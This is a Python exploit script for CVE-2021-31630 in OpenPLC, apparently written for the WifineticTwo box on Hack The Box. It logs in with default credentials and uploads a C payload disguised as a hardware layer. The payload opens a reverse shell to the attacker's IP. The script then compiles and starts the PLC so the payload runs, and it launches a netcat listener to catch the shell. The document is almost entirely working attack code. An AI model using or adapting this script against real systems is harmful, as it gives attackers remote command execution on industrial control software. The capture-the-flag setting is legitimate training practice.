#!/usr/bin/env python3
import requests
import argparse
import signal
import time
import sys
import subprocess

# Parse command-line arguments
parser = argparse.ArgumentParser(
    description="Exploit CVE-2021-31630 in OpenPLC for WifineticTwo box at Hack The Box"
)
parser.add_argument(
    "-ip", type=str, default="10.*.*.*", help="IP address to listen on", required=True
)
args = parser.parse_args()

# Check if IP address is the default value
if args.ip == "10.*.*.*":
    print("[-] Please provide the IP address to listen on using the -ip argument.")
    sys.exit(1)

local_ip = args.ip
local_port = 4567
baseURL = "http://10.10.11.7:8080"

# Start Netcat listener
nc_process = subprocess.Popen(["nc", "-lvp", "4567"])

def signal_handler(sig, frame):
    print("\n[!] You pressed Ctrl+C!")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "multipart/form-data; boundary=---------------------------3040215761330541470566170096",
    "Origin": "http://10.10.11.7:8080",
    "Connection": "close",
    "Referer": "http://10.10.11.7:8080/hardware",
}
print("[+] running")
uploadRQ = f"""\
-----------------------------3040215761330541470566170096
Content-Disposition: form-data; name="hardware_layer"

blank_linux
-----------------------------3040215761330541470566170096
Content-Disposition: form-data; name="custom_layer_code"

#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int ignored_bool_inputs[] = {{-1}};
int ignored_bool_outputs[] = {{-1}};
int ignored_int_inputs[] = {{-1}};
int ignored_int_outputs[] = {{-1}};

void initCustomLayer()
{{
}}

void updateCustomIn()
{{

}}

void updateCustomOut()
{{
    int port = 4567;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{local_ip}");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"bash", NULL}};
    execvp("bash", argv);

    return 0;
}}

-----------------------------3040215761330541470566170096--
"""

with requests.Session() as session:
    loginCREDS = {"username": 'openplc', "password": 'openplc'}
    LOGINresponse = session.post(baseURL + "/login", data=loginCREDS)
    print("[+] Logging in .....")

    if LOGINresponse.ok and len(LOGINresponse.content) >= 34100:
        print("[+] Logged in successfully.")
        responseUPLAOD = session.post(
            baseURL + "/hardware", headers=headers, data=uploadRQ.encode("utf-8")
        )
        anotherget = session.get(baseURL + "/compile-program?file=blank_program.st")
        compiling = True

        while compiling:
            checkURL = baseURL+ "/compilation-logs"
            check = session.get(checkURL)

            if check.status_code == 200 and len(check.content) < 250:
                print("[+] The compiling is running, checking again in 5 seconds...")
                time.sleep(5)
            elif check.status_code == 200 and len(check.content) >= 250:
                print("[+] Exploit uploaded successfully.")
                print("[+] Gaining reverse shell.")
                time.sleep(2)
                print(f"[+] Check your listener.")
                start = session.get(baseURL + "/start_plc")
                compiling = False
            else:
                print(
                     f"[-] Unexpected status or response length. Response body:\n{check.text}"
                )
                compiling = False

    else:
        print("[-] Login failed, check username and password!")
